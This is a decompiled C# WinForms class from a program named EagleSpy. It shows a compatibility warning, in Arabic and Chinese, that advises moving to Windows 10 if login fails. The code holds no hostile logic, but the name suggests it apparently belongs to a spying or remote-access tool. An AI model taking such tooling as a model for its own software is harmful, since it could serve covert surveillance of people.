using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200004B RID: 75
[DesignerGenerated]
public partial class comptableform : Form
{
	// Token: 0x06000371 RID: 881 RVA: 0x00002822 File Offset: 0x00000A22
	public comptableform()
	{
		base.Load += this.Comptableform_Load;
		this.armsg = "اكتشف EagleSpy نظام تشغيل Windows غير متوافق ، إذا واجهت مشكلة في تسجيل الدخول ، فحاول الانتقال إلى Windows 10";
		this.cnmsg = "EagleSpy检测到不兼容的Windows操作系统，如果您遇到登录问题，请尝试转移到Windows 10";
		this.InitializeComponent();
	}

	// Token: 0x06000374 RID: 884 RVA: 0x00002858 File Offset: 0x00000A58
	private void Loginbtn_Click(object sender, EventArgs e)
	{
		base.Close();
	}

	// Token: 0x06000375 RID: 885 RVA: 0x0000206C File Offset: 0x0000026C
	private void Comptableform_Load(object sender, EventArgs e)
	{
	}

	// Token: 0x040003D2 RID: 978
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("loginbtn")]
	private DrakeUIButtonIcon _loginbtn;

	// Token: 0x040003D3 RID: 979
	private string armsg;

	// Token: 0x040003D4 RID: 980
	private string cnmsg;
}
